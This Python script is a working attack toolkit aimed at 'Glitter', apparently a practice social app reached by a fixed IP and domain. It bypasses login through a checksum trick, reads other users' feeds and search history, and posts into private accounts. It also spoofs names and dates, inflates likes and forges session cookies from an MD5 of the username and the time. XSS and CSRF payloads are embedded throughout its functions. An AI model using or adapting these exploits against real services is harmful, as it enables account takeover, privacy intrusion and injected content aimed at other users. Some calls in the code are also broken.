import socket
import time
import requests
import hashlib
import datetime

SERVER_PORT = 1336
SERVER_IP = "44.224.228.136"
URL = "http://glitter.org.il/"
DEFAULT_HEADERS = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json', 'Origin': URL, 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7', 'Connection': 'keep-alive',}


sock = None
user_id = 21502
current_time = None
cookie = None
username = None
password = None
target_user_id = None


def send_and_receive_app(message):
    """
    a function to send a message and receive the server's response, app only
    :param message: the message to send to the server
    :type message: str
    :return: the response from the server
    :rtype: str
    """
    global sock
    if sock is None:
        raise RuntimeError("Socket is not connected")
    sock.send(message.encode())
    try:
        response = sock.recv(8000).decode()
    except Exception as e:
        print("error recovering message from the server", e)
        return None
    return response


def send_and_receive_website(method, path, params=None, data=None, referer='home'):
    """
    a function to send a message to the server and receive a response, website only
    :return: the response from the server
    :rtype: str
    """
    global cookie
    url = URL + path
    headers = dict(DEFAULT_HEADERS)
    headers['Referer'] = URL + referer
    use_cookie = not (referer == "login" or path == "user/")
    if use_cookie and cookie:
        resp = requests.request(method=method, url=url, params=params, data=data, headers=headers, cookie=cookie)
    else:
        resp = requests.request(method=method, url=url, params=params, data=data, headers=headers)
    return resp


def calculate_checksum():
    """
    a function to calculate the checksum
    :param username: the user's username
    :param password: the user's password
    :type username: str
    :type password: str
    :return: the checksum
    :rtype: int
    """
    checksum = 0
    for char in username + password:
        checksum += ord(char)
    return checksum


def connect_to_server():
    """
    a function to connect to the server
    :return: the conversation socket
    :rtype: socket
    """
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    return sock


def login_with_checksum_bypass(login_username, login_password):
    """
    a function to login into the server (without password)
    :param login_password:
    :param login_username: the username of the profile we want to log into
    :type login_username: str
    :return: the conversation socket and the user id (if found)
    :rtype: tuple
    """
    connect_to_server()
    if login_password is None:
        dummy_password = "~*`'>``~"
        login_msg = ('100#{gli&&er}{"user_name":"' + login_username + '","password":"' + dummy_password + '","enable_push_notifications":true}##')
    else:
        login_msg = ('100#{gli&&er}{"user_name":"' + login_username + '","password":"' + login_password + '","enable_push_notifications":true}##')
    response = send_and_receive_app(login_msg)
    print("Response: " + response)
    if "ascii checksum:" in response:
        checksum_start = response.find("ascii checksum: ") + 16
        checksum_end = response.find("{", checksum_start)
        required_checksum = int(response[checksum_start:checksum_end])
        print("Server requires checksum: " + str(required_checksum))
        if login_password is None:
            current_sum = calculate_checksum()
            needed_for_password = required_checksum - current_sum
            if needed_for_password > 0:
                if needed_for_password < 127:
                    temp_password = chr(needed_for_password)
                else:
                    temp_password = "a" * (needed_for_password // 97)
            else:
                temp_password = "1"
            login_msg = ('100#{gli&&er}{"user_name":"' + login_username + '","password":"' + temp_password + '","enable_push_notifications":true}##')
            response = send_and_receive_app(login_msg)
            print("Login response: " + response)
            if "Please complete ascii checksum" in response:
                checksum_msg = '110#{gli&&er}' + str(required_checksum) + '##'
                response = send_and_receive_app(checksum_msg)
                print("Authentication response: " + response)
        else:
            if "Authentication approved" in response:
                print("Successfully logged in!")
                extract_user_id(response)
    return sock, user_id


def send_multiple_likes(glit_id, count):
    """
    a fucntion to like a glit multiple times from one user
    :param glit_id: the id of the glit we want to like
    :param count: how many times to like the glit
    :type glit_id: str
    :type count: int
    :return: none
    """
    global sock, user_id
    for i in range(count):
        like_msg = ('710#{gli&&er}{"glit_id":' + glit_id + ',"user_id":' + user_id + ',"user_screen_name":"kolin jon"}##')
        response = send_and_receive_app(like_msg)
        print("Like " + str(i + 1) + " response: " + response)
        time.sleep(0.5)


def send_like_with_fake_name(glit_id, fake_name):
    """
    a function to like a glit with a fake name
    :param glit_id: the id of the glit we want to like
    :param fake_name: the fake name we will like the glit
    :type glit_id: str
    :type fake_name: str
    :return: none
    """
    global sock, user_id
    like_msg = ('710#{gli&&er}{"glit_id":' + glit_id + ',"user_id":' + user_id + ',"user_screen_name":"' + fake_name + '"}##')
    response = send_and_receive_app(like_msg)
    print("Response: " + response)


def send_glit_with_different_profile_image(profile_image):
    """
    a function to send a glit with a whatever profile image the user would like to use (from im1 to im8)
    :param profile_image: the image the user wants to send a glit with
    :type profile_image: str
    :return: none
    """
    global user_id, current_time
    current_time = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im' + profile_image + '","background_color":"White","date":"' + current_time + '","content":"message","font_color":"black","id":-1}##')
    response = send_and_receive_app(glit_msg)
    print("Response: " + response)


def send_glit_from_past():
    """
    a function to send a glit from the past
    :return: none
    """
    global user_id
    past_date = "2000-06-17T11:54:58.220Z"
    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im3","background_color":"OrangeRed","date":"' + past_date + '","content":"Message from the past!","font_color":"black","id":-1}##')
    response = send_and_receive_app(glit_msg)
    print("Response: " + response)


def access_other_user_feed():
    """
    a function to access other user's feed using their user_id
    :param target_user_id: the user_id of the target
    :type target_user_id: str
    :return: none
    """
    feed_msg = ('500#{gli&&er}{"feed_owner_id":' + target_user_id + ',"end_date":"2026-06-26T12:00:00.000Z","glit_count":10000}##')
    response = send_and_receive_app(feed_msg)
    print("Feed response: " + response)


def send_to_private_account():
    """
    a function to send a glit to a private account
    :param target_user_id: the user_id of the target
    :type target_user_id: str
    :return: none
    """
    global user_id, current_time
    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + target_user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"Red","date":"' + current_time + '","content":"post from kolin jon on private feed!","font_color":"black","id":-1}##')
    response = send_and_receive_app(glit_msg)
    print("Response: " + response)


def send_colored_font_glit(color):
    """
    a function to send a glit with a colored font (not black
    :param color: the user's desired text color
    :type color: str
    :return: none
    """
    global user_id
    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im1","background_color":"White","date":"' + current_time + '","content":"Colored text message!","font_color":"' + color + '","id":-1}##')
    response = send_and_receive_app(glit_msg)
    print("Response: " + response)


def send_xss_image_glit():
    """
    a function to post a glit with a image using xss
    :return: none
    """
    global user_id
    xss_payload = """<img onload=\"window.open('https://www.google.com/', '_blank');\" src=\"https://images.unsplash.com/photo-1481833761820-0509d3217039?auto=format&fit=crop&w=800&q=80\" alt=\"Eiffel Tower in Heart Frame\" />"""
    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"White","date":"' + current_time + '","content":"' + xss_payload + '","font_color":"black","id":-1}##')
    response = send_and_receive_app(glit_msg)
    print("Response: " + response)


def send_xss_link_glit():
    """
    a function to post a glit with a clickable link using xss
    :return: none
    """
    global user_id
    xss_link = '<a href=\\"javascript:alert(\'XSS\')\\" onclick=\\"alert(\'Clicked!\')\\">Click me</a>'
    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"Teal","date":"' + current_time + '","content":"' + xss_link + '","font_color":"black","id":-1}##')
    response = send_and_receive_app(glit_msg)
    print("Response: " + response)


def send_comment_fake_name(glit_id, fake_name):
    """
    a function to comment on a glit with a fake name
    :param glit_id: the id of the glit we want comment on with a fake name
    :param fake_name: the fake name that will be used as the fake name
    :type glit_id: str
    :type fake_name: str
    :return: none
    """
    global user_id
    comment_msg = ('650#{gli&&er}{"glit_id":' + glit_id + ',"user_id":' + user_id + ',"user_screen_name":"' + fake_name + '","content":"Comment with fake name","date":"' + current_time + '"}##')
    response = send_and_receive_app(comment_msg)
    print("Response: " + response)


def send_multiple_wows(glit_id, count):
    """
    a function to post multiple wows on a glit
    :param glit_id: the id of the glit we want to wow
    :param count: the amount of wows we will do
    :type glit_id: str
    :type count: int
    :return: none
    """
    global user_id
    for i in range(count):
        wow_msg = ('750#{gli&&er}{"glit_id":' + str(glit_id) + ',"user_id":' + str(user_id) + ',"user_screen_name":"kolin jon"}##')
        response = send_and_receive_app(wow_msg)
        print("Wow " + str(i + 1) + " response: " + response)
        time.sleep(0.5)


def xsrf_send_message_to_yourself_from_another_user(publisher_id):
    global current_time
    current_time = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
    path = (
        "glit?id=-1"
        + "&feed_owner_id=" + str(user_id)
        + "&publisher_id=" + publisher_id
        + "&publisher_screen_name=kolin%20pom"
        + "&publisher_avatar=im1"
        + "&background_color=White"
        + "&date=" + current_time
        + "&content=I_was_hacked"
        + "&font_color=black"
    )
    send_and_receive_website(method="GET", path=path)


def login_website():
    global current_time
    current_time = datetime.datetime.now()
    path = "user"
    payload = '["' + username + '","' + password + '"]'
    response = send_and_receive_website(method="POST", path=path, data=payload, referer="login")
    print(response)
    if "200" in response:
        print("Successfully logged in!")
        extract_sparkle_cookie(response)
        extract_user_id(response)
    return response


def extract_sparkle_cookie(response_text):
    global cookie
    if '"sparkle":"' in response_text:
        start = response_text.find('"sparkle":"') + len('"sparkle":"')
        end = response_text.find('"', start)
        sparkle = response_text[start:end]
        cookie = {"sparkle": sparkle}


def extract_user_id(response_text):
    """
    a function to extract the user_id from
    :param response_text:
    :return:
    """
    global user_id
    if '"id":' in response_text:
        id_start = response_text.find('"id":') + 5
        id_end = response_text.find(',', id_start)
        if id_end == -1:
            id_end = response_text.find('}', id_start)
        user_id = response_text[id_start:id_end]


def get_password():
    pass


def post_video_to_another_user_feed():
    global user_id
    global current_time
    glit_msg = ('550#{gli&&er}{"feed_owner_id":' + target_user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"Red","date":"' + current_time + '","content":"<video autoplay loop><source src="https://files.catbox.moe/ehhz83.mp4" type="video/mp4"></video><audio autoplay><source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg"></audio>","font_color":"black","id":-1}##')
    response = send_and_receive_app(glit_msg)
    print("Response: " + response)


def load_another_user_search_history():
    path = "history/" + target_user_id
    response = send_and_receive_website("GET", path, None, None, None)


def generate_cookie(target_username):
    now = datetime.datetime.now()
    date_str = now.strftime("%d%m%Y")
    hour = str(int(now.strftime("%H")))
    minute = now.strftime("%M")
    time_str = hour + minute
    username_hash = hashlib.md5(target_username.encode()).hexdigest()
    generated_cookie = date_str + "." + username_hash + "." + time_str + "." + date_str
    return generated_cookie
